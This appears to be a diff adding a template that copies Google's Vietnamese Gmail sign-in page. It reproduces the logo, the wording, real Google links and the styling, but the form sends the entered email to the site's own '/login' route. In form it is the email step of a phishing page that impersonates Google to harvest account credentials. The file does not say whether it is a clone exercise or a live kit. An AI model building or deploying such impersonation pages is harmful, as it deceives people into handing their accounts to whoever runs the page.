@@ -1,0 +1,251 @@
+<form action="/login" method="POST">
+    <div class="maindiv">
+        <div class="click-out">
+            <div class="header-google">
+                <img src="img/google.png" alt="Google">
+                <h2><span style="font-weight: 100;">Đăng nhập</span></h2>
+                <h3>Tiếp tục tới Gmail</h3>
+            </div>
+        </div>
+        <div class="inputs">
+            <div class="Fields">
+                <div class="Fieldset">
+                    <input type="text" class="Before-FS" name="email" value="{{oldInput.email}}" required=""
+                        autocomplete="off">
+                    <div class="FsH"><span class="span-email">Email hoặc số điện thoại</span></div>
+                    <label class="placeholder" style="top:19px">Email hoặc số điện thoại</label>
+                </div>
+                {{#if errorMessage}}
+                <script>
+                    document.getElementsByClassName("Before-FS")[0].style.border = '2px solid #D93025'
+                    spanEmail = document.getElementsByClassName('span-email')[0].style.color = '#D93025'
+                    document.getElementsByClassName("FsH")[0].classList.add("error_FsH")
+                    let form_email = document.getElementsByClassName("Before-FS")[0]
+                    let error_FsH = document.getElementsByClassName('error_FsH')[0]
+
+                    form_email.onclick = function () {
+                        error_FsH.style.display = 'block'
+                        error_FsH.style.color = '#1a73e8'
+                    }
+                </script>
+                <div class="user-message-error" style="display: flex; text-align:left;margin-top: 5px">
+                    <img src="img/chu-y.png" alt="" style="height: 21px;">
+                    <div style="font-size: 13px; color: #D93025; padding-top: 3px; margin-bottom: 5px">
+                        {{errorMessage}}
+                    </div>
+                </div>
+
+                {{/if}}
+                <div class="quen-email" style="text-align: left; margin-top: 5px">
+                    <a style="color: #1a73e8; font-weight: 600; font-size: 15px;" href="">Bạn quên địa chỉ
+                        email?</a>
+                </div>
+            </div>
+            <div class="about-laptop click-out"
+                style="text-align: left; color: #5f6368; font-size: 14.6px; font-weight: 200; line-height: 1.4286; margin: 45px 0 40px 0;">
+                Đây không phải máy tính của bạn? Hãy sử dụng chế độ Khách để đăng nhập một cách riêng tư. <a
+                    style="color: #1a73e8; font-weight: 600;"
+                    href="https://support.google.com/chrome/answer/6130773">Tìm hiểu thêm</a>
+            </div>
+            <div class="div-create-next" style="text-align: left; display:flex;">
+                <div class="create-user"
+                    style="padding-top: 7px; font-size: 14.5px; margin-left: -20px; font-weight: 500;">
+                    <a style="color:#1a73e8;"
+                        href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=VN&continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Dvi&dsh=S2131666562%3A1679745005834027&flowEntry=SignUp&flowName=GlifWebSignIn&hl=vi&ifkv=AQMjQ7STrTWhSvt6HIh3CmjYJeobmF25afB5GeeQaitU9hle2-EPYFC0_dbDTQHJvBtXjNXPy-S6-g">
+                        Tạo tài khoản
+                    </a>
+                </div>
+                <div class="next">
+                    <button style="margin-left: 163px;" type="submit" class="btn-next">Tiếp theo</button>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+</form>
+
+
+<script>
+    function clickOut() {
+        document.getElementsByClassName('FsH')[0].style.display = 'none';
+        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '1px';
+    }
+    document.getElementsByClassName("click-out")[0].onclick = clickOut
+    document.getElementsByClassName("click-out")[1].onclick = clickOut
+
+    document.getElementsByClassName("Before-FS")[0].onclick = function () {
+        document.getElementsByClassName('FsH')[0].style.display = 'block'
+        document.getElementsByClassName('FsH')[0].style.color = '#1a73e8'
+        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '2px';
+    }
+
+</script>
+
+
+<style>
+    a {
+        text-decoration: none;
+    }
+
+    body {
+        font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+
+    }
+
+    img {
+        max-width: 85px;
+        max-height: 45px;
+    }
+
+    .maindiv {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 368px;
+        min-height: 400px;
+        padding: 3rem;
+        border-radius: 0.5rem;
+        border: 1px solid #e1e1e1;
+        text-align: center;
+    }
+
+    .maindiv .Fields {
+        display: inline-block;
+        position: relative;
+    }
+
+    h2 {
+        color: #202124;
+        font-size: 23px;
+        font-weight: 200px;
+    }
+
+    h3 {
+        padding-bottom: 10px;
+        color: #202124;
+        font-size: 15px;
+        font-weight: 400;
+    }
+
+    input {
+        outline: none;
+    }
+
+    .Before-FS {
+        width: 344px;
+        border: 1px solid #c2c2c2;
+        border-radius: 3px;
+        height: 28px;
+        font-size: 16px;
+        margin: 1px 1px 0 1px;
+        padding: 13px 15px;
+        transition: 0.1s;
+    }
+
+    .Before-FS:focus {
+        border: 2px solid #1a73e8;
+
+    }
+
+    .Before-FS:valid {
+        border: 2px solid #1a73e8;
+    }
+
+    .placeholder {
+        position: absolute;
+        left: 20px;
+        top: 19px;
+        color: #80868b;
+        font-size: 16px;
+        font-weight: 400;
+        pointer-events: none;
+        transition: 0.4s
+    }
+
+    input:focus~label.placeholder,
+    input:valid~label.placeholder {
+        top: 3px;
+        font-size: 10px;
+        opacity: 0;
+    }
+
+    button {
+        cursor: pointer;
+        border: 1px solid transparent;
+        padding: 8px 18px;
+        font-size: 14px;
+        line-height: 1.42;
+        color: white;
+        border-radius: 4px;
+        background-color: #1a73e8;
+        outline: none;
+        min-width: 88px;
+
+    }
+
+    .create-user>a {
+        padding: 10px;
+        margin-left: 15px;
+    }
+
+    .create-user>a:hover {
+        background-color: #e7edf6;
+    }
+
+    .FsH {
+        top: -6px;
+        position: absolute;
+        padding: 0 8px;
+        font-size: 13px;
+        background-color: #fff;
+        margin-left: 10px;
+        display: none;
+    }
+
+    .div-check>label {
+        padding-left: 20px;
+    }
+
+    @media only screen and (max-width: 500px) {
+        .maindiv {
+            width: 100%;
+            padding: 0;
+            min-height: 0;
+            transform: none;
+            top: 20px;
+            left: 0;
+            right: 0;
+            border: none;
+        }
+
+        .about-laptop {
+            display: none;
+        }
+
+        .div-create-next {
+            margin-top: 40px;
+        }
+
+        .create-user {
+            position: absolute;
+            left: 15px;
+        }
+
+        .next>.btn-next {
+            position: absolute;
+            right: 15px;
+        }
+
+        .quen-email {
+            position: absolute;
+            left: 10px;
+        }
+
+        .Before-FS {
+            width: 324px;
+
+        }
+    }
+</style>
